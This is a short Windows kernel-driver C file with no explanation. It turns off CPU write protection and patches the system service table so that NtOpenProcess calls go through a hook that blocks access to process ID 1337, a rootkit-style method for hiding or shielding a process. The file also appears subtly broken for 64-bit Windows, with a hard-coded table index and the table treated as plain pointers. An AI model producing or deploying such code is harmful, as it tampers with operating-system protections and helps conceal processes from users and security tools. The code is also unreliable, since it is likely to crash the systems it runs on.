#include <ntddk.h>
#include <intrin.h>

typedef struct _SYSTEM_SERVICE_TABLE {
    PVOID *ServiceTable;
    PVOID *CounterTable;
    ULONG NumberOfServices;
    PVOID *ParamTable;
} SYSTEM_SERVICE_TABLE, *PSYSTEM_SERVICE_TABLE;

extern PSYSTEM_SERVICE_TABLE KeServiceDescriptorTable;

ULONG64 original_NtOpenProcess = 0;
ULONG64 original_NtReadVirtualMemory = 0;

void DisableWriteProtection(void) {
    ULONG64 cr0 = __readcr0();
    cr0 &= ~0x10000;
    __writecr0(cr0);
}

void EnableWriteProtection(void) {
    ULONG64 cr0 = __readcr0();
    cr0 |= 0x10000;
    __writecr0(cr0);
}

NTSTATUS HookNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, 
                           POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    if (ClientId && ClientId->UniqueProcess == (HANDLE)1337) {
        return STATUS_ACCESS_DENIED;
    }
    
    NTSTATUS (*original)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID) = (void*)original_NtOpenProcess;
    return original(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
}

void InstallSSDTHooks(void) {
    ULONG64 ssdtBase = (ULONG64)KeServiceDescriptorTable->ServiceTable;
    
    original_NtOpenProcess = (ULONG64)MmGetSystemRoutineAddress(&(UNICODE_STRING)RTL_CONSTANT_STRING(L"NtOpenProcess"));
    
    DisableWriteProtection();
    ((PVOID*)ssdtBase)[0x32] = (PVOID)HookNtOpenProcess;
    EnableWriteProtection();
}

void RestoreSSDTHooks(void) {
    ULONG64 ssdtBase = (ULONG64)KeServiceDescriptorTable->ServiceTable;
    
    DisableWriteProtection();
    ((PVOID*)ssdtBase)[0x32] = (PVOID)original_NtOpenProcess;
    EnableWriteProtection();
}
